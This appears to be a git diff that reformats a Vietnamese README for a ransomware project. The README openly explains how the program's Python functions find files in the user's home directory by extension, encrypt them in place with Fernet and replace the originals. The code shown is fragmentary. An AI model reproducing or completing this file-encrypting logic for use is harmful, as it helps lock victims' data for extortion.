@@ -2,7 +2,7 @@
 Chương trình ransomware, một loại phần mềm độc hại thường sử dụng để mã hóa các tệp trên máy tính của người dùng và yêu cầu một khoản tiền chuộc để giải mã chúng.
 
 ## MODULES
-**1.CRYPTO**
+### ENCDEC
 ```python
 def Process_Files(Private: Fernet, mode: str):
     for _, files in List_Files().items():
@@ -25,18 +25,13 @@ def Process_Files(Private: Fernet, mode: str):
                 if os.path.exists(temp_file.name):
                     os.remove(temp_file.name)
 ```
-1. Hàm *Process_Files* nhận vào hai tham số: *Private*, một đối tượng *Fernet* được sử dụng để mã hóa và giải mã, và *mode*, một chuỗi chỉ định chế độ hoạt động (‘encrypt’ hoặc ‘decrypt’).
-
-2. Hàm này sẽ duyệt qua tất cả các tệp tin được trả về bởi hàm *List_Files*.
-
-3. Đối với mỗi tệp, nó tạo một tệp tạm thời với tên là tên tệp gốc kèm theo ‘*.temp*’.
-
-4. Nó mở tệp gốc để đọc và tệp tạm thời để ghi, với kích thước bộ đệm là 4096*1024 byte. Sử dụng mmap để ánh xạ tệp gốc vào bộ nhớ. 
+- Hàm *Process_Files* nhận vào hai tham số: *Private*, một đối tượng *Fernet* được sử dụng để mã hóa và giải mã, và *mode*, một chuỗi chỉ định chế độ hoạt động (‘encrypt’ hoặc ‘decrypt’).
+- Hàm này sẽ duyệt qua tất cả các tệp tin được trả về bởi hàm *List_Files*.
+- Đối với mỗi tệp, nó tạo một tệp tạm thời với tên là tên tệp gốc kèm theo ‘*.temp*’.
+- Nó mở tệp gốc để đọc và tệp tạm thời để ghi, với kích thước bộ đệm là 4096*1024 byte. Sử dụng mmap để ánh xạ tệp gốc vào bộ nhớ. 
 Sau đó đọc và xử lý từng ‘*chunk*’ của tệp gốc, với kích thước ‘*chunk*’ là 4096*1024 byte.
-
-5. Mỗi ‘*chunk*’ sau đó được mã hóa (nếu mode là ‘*encrypt*’) hoặc giải mã (nếu mode là ‘*decrypt*’) bằng cách sử dụng đối tượng Fernet, và sau đó được ghi vào tệp tạm thời.
-
-6. Khi tất cả các ‘*chunk*’ đã được xử lý, tệp tạm thời được đổi tên thành tên của tệp gốc, thay thế tệp gốc. Nếu có lỗi xảy ra trong quá trình này, hàm sẽ bỏ qua lỗi và tiếp tục với tệp tiếp theo. Cuối cùng, nếu tệp tạm thời vẫn tồn tại nó sẽ được xóa.
+- Mỗi ‘*chunk*’ sau đó được mã hóa (nếu mode là ‘*encrypt*’) hoặc giải mã (nếu mode là ‘*decrypt*’) bằng cách sử dụng đối tượng Fernet, và sau đó được ghi vào tệp tạm thời.
+- Khi tất cả các ‘*chunk*’ đã được xử lý, tệp tạm thời được đổi tên thành tên của tệp gốc, thay thế tệp gốc. Nếu có lỗi xảy ra trong quá trình này, hàm sẽ bỏ qua lỗi và tiếp tục với tệp tiếp theo. Cuối cùng, nếu tệp tạm thời vẫn tồn tại nó sẽ được xóa.
 ```python
 def List_Files() -> dict:
     with open('scripts/extensions.yaml', 'r') as file:
@@ -51,13 +46,13 @@ def List_Files() -> dict:
 
     return file_categories
 ```
-1. Hàm mở tệp ‘*scripts/extensions.yaml*’ để đọc và sử dụng hàm *Safe_Load(file)* để phân tích dữ liệu *YAML* từ tệp này. Kết quả được lưu vào biến *exts*.
+- Hàm mở tệp ‘*scripts/extensions.yaml*’ để đọc và sử dụng hàm `Safe_Load(file)` để phân tích dữ liệu *YAML* từ tệp này. Kết quả được lưu vào biến `exts`.
 
-2. Tạo một từ điển *file_categories* với các khóa là các danh mục từ *exts* và giá trị là các danh sách trống. Tạo một từ điển *extcategory* mà mỗi phần mở rộng tệp trong *exts* là một khóa và giá trị tương ứng là danh mục của phần mở rộng đó.
+- Tạo một từ điển `file_categories` với các khóa là các danh mục từ `exts` và giá trị là các danh sách trống. Tạo một từ điển *extcategory* mà mỗi phần mở rộng tệp trong `exts` là một khóa và giá trị tương ứng là danh mục của phần mở rộng đó.
 
-3. Sau đó duyệt qua tất cả các tệp trong thư mục chính của người dùng. Nếu một mục là tệp và phần mở rộng của nó (được chuyển thành chữ thường) có trong *extcategory*, tệp đó sẽ được thêm vào danh mục tương ứng trong *file_categories*.
+- Sau đó duyệt qua tất cả các tệp trong thư mục chính của người dùng. Nếu một mục là tệp và phần mở rộng của nó (được chuyển thành chữ thường) có trong `extcategory`, tệp đó sẽ được thêm vào danh mục tương ứng trong `file_categories`.
 
-**2.SYSTEM**
+### SYSTEM
 ```python
 class System:
     def __init__(self) -> None:
@@ -111,11 +106,8 @@ def Console(ip: str, msg: str, color: str) -> None:
     message = f" [{Col.Green}{ip}{Col.White}] --> {color_code}{msg}{Col.White}."
     print(message)
 ```
-1. Hàm getattr được sử dụng để lấy giá trị thuộc tính color từ đối tượng Col.
-
-2. Tạo một chuỗi được định dạng
-
-3. In ra chuỗi đã được định dạng
+- Hàm getattr được sử dụng để lấy giá trị thuộc tính color từ đối tượng Col.
+- Tạo một chuỗi được định dạng và in ra chuỗi đã được định dạng.
 
 ## SERVER - CLIENT
 
